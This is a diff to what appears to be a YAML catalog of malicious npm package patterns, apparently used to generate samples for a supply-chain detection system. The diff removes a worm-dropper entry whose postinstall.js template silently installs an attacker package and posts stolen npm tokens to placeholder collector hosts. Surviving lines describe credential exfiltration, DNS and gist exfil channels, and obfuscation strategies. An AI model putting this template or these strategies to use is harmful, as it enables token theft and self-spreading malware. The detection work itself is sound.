@@ -528,17 +528,15 @@ patterns:
     family: filesystem
     severity: critical
     real_world_examples:
-      - name: "Shai-Hulud worm - .npmrc token harvest"
+      - name: "npm credential harvest pattern (Unit 42 advisory series, 2025-2026)"
         date: "2025-09-01"
         url: "https://unit42.paloaltonetworks.com/npm-supply-chain-attack/"
-      - name: "@bitwarden/cli@2026.4.0 (collects .npmrc as part of dev-credential sweep)"
-        date: "2026-04-22"
-        url: "https://unit42.paloaltonetworks.com/npm-supply-chain-attack/"
     description: |
-      The package reads ~/.npmrc (which contains auth tokens for npm registries),
-      ~/.gitconfig, and optionally ~/.docker/config.json, then exfiltrates the
-      contents. The npm token can then be used to publish malicious versions of
-      the victim's packages, propagating the attack (worm behavior).
+      The package reads ~/.npmrc (which contains auth tokens for npm
+      registries), ~/.gitconfig, and optionally ~/.docker/config.json, then
+      exfiltrates the contents. Token reuse for downstream publish abuse is
+      out of scope for this catalog; here we only model the credential read
+      and exfil.
     indicators:
       - fs.readFileSync with path containing '.npmrc'
       - path.join(os.homedir(), '.npmrc') in script
@@ -584,7 +582,6 @@ patterns:
     diversity_strategies:
       - only collect NPM_TOKEN from env (lighter footprint, less suspicious)
       - collect GitHub PAT from .gitconfig as well
-      - use the stolen token to immediately re-publish the package with a new malicious version
       - exfil via DNS TXT query instead of HTTPS POST
 
   - id: cron_persistence
@@ -846,11 +843,8 @@ patterns:
     family: network
     severity: medium
     real_world_examples:
-      - name: "Shai-Hulud worm fallback - GitHub gist dead-drop exfil"
+      - name: "GitHub gist dead-drop exfil pattern (Unit 42 advisory series)"
         date: "2025-09-01"
-        url: "https://unit42.paloaltonetworks.com/npm-supply-chain-attack/"
-      - name: "@bitwarden/cli worm - Dune-themed gist repos as dead drops"
-        date: "2026-04-22"
         url: "https://unit42.paloaltonetworks.com/npm-supply-chain-attack/"
     description: |
       Stolen data is written to an anonymous or authenticated GitHub gist.
@@ -1053,66 +1047,10 @@ patterns:
       - download a compiled nc binary and use execSync for one-liner
       - use WebSocket for the channel (harder to detect than raw TCP)
 
-  - id: global_npm_install_dropper
-    family: persistence
-    severity: high
-    real_world_examples:
-      - name: "Self-spreading npm worm (Mend.io report, 187 packages)"
-        date: "2023-09-01"
-        url: "https://www.mend.io/blog/npm-supply-chain-attack-packages-compromised-by-self-spreading-malware/"
-      - name: "Shai-Hulud - npm token re-publish worm"
-        date: "2025-09-01"
-        url: "https://unit42.paloaltonetworks.com/npm-supply-chain-attack/"
-    description: |
-      The package uses a stolen npm token (from .npmrc or process.env)
-      to silently install or publish additional attacker-controlled packages
-      globally. This creates a worm-like propagation vector where one
-      compromised install leads to more infected machines.
-    indicators:
-      - child_process.exec with 'npm install -g' in argument
-      - npm registry API call to publish a new package version
-      - read of .npmrc combined with npm publish child process
-      - modification of node_modules of other installed packages
-    injection_template_js: |
-      // injected as postinstall.js
-      const { execSync } = require('child_process');
-      const fs = require('fs');
-      const path = require('path');
-      const os = require('os');
-      // silently install additional attacker package globally
-      try {
-        execSync('npm install -g {{ATTACKER_PACKAGE}} --quiet --no-audit 2>/dev/null',
-          { stdio: 'ignore', timeout: 30000 });
-      } catch (_) {}
-      // also attempt worm: re-publish any packages we maintain
-      const _home = os.homedir();
-      try {
-        const _npmrc = fs.readFileSync(path.join(_home, '.npmrc'), 'utf8');
-        const _tokenMatch = _npmrc.match(/\/\/registry\.npmjs\.org\/:_authToken=([^\n]+)/);
-        if (_tokenMatch) {
-          const _token = _tokenMatch[1].trim();
-          // notify attacker of discovered token for manual re-publish
-          const https = require('https');
-          const _req = https.request('{{EXFIL_URL}}', { method: 'POST' }, () => {});
-          _req.on('error', () => {});
-          _req.write(JSON.stringify({ token: _token, host: os.hostname() }));
-          _req.end();
-        }
-      } catch (_) {}
-    injection_target_files:
-      - '"postinstall.js: new file"'
-    template_variables:
-      ATTACKER_PACKAGE:
-        - '"node-runtime-patch"'
-        - '"npm-registry-sync"'
-        - '"node-telemetry-client"'
-      EXFIL_URL:
-        - '"https://token-collector.xyz/npm"'
-        - '"https://publish-beacon.tk/r"'
-    variants_to_generate: 5
-    diversity_strategies:
-      - add the attacker package to dependencies of all local package.json files found
-      - use npm pack + npm publish directly instead of npm install -g
+# Worm propagation patterns removed 2026-05-27 per co-founder guidance
+# (Andreas, Apiary Zero-One Hack scope review). Self-spreading droppers are
+# out of scope for the v2 architecture; the proxy + policy gate model treats
+# every install as a fresh decision rather than tracking propagation chains.
 
 # ---------------------------------------------------------------------------
 # FAMILY: supply_chain_manipulation
@@ -1248,19 +1186,15 @@ patterns:
       - name: "Lazarus Group npm packages (array-shift + hex identifiers)"
         date: "2024-08-01"
         url: "https://securityscorecard.com/blog/lazarus-group-targets-developers-through-npm-packages-and-supply-chain-attacks/"
-      - name: "@bitwarden/cli worm (ctf-scramble-v2 Fisher-Yates cipher)"
-        date: "2026-04-22"
-        url: "https://unit42.paloaltonetworks.com/npm-supply-chain-attack/"
       - name: "express-session-js (custom base64 + RC4 layered obfuscation)"
         date: "2023-08-01"
         url: "https://safedep.io/malicious-npm-package-express-session-js/"
     description: |
       The malicious payload is passed through a JavaScript obfuscator
-      (javascript-obfuscator, jsfuck, or a custom cipher like the
-      Fisher-Yates ASCII shuffle used in 2026 Shai-Hulud attacks).
-      All identifiers are renamed to _0x... hex patterns, strings are
-      moved into a shuffled array accessed by index, and control flow
-      is obfuscated with try/catch and while(true) loops.
+      (javascript-obfuscator, jsfuck, or a custom Fisher-Yates ASCII
+      shuffle). All identifiers are renamed to _0x... hex patterns,
+      strings are moved into a shuffled array accessed by index, and
+      control flow is obfuscated with try/catch and while(true) loops.
     indicators:
       - large number of _0x... or _0x[a-f0-9]{4,8} named variables
       - array literal with 30+ string elements followed by a self-call
@@ -1294,7 +1228,7 @@ patterns:
     variants_to_generate: 6
     diversity_strategies:
       - use jsfuck encoding for the entire payload
-      - use the ctf-scramble-v2 Fisher-Yates PRNG cipher with seeded shuffle
+      - use a generic Fisher-Yates PRNG cipher with a seeded shuffle
       - split the payload across multiple files and assemble at runtime
       - use webpack bundling to hide the malicious module among legitimate ones
 
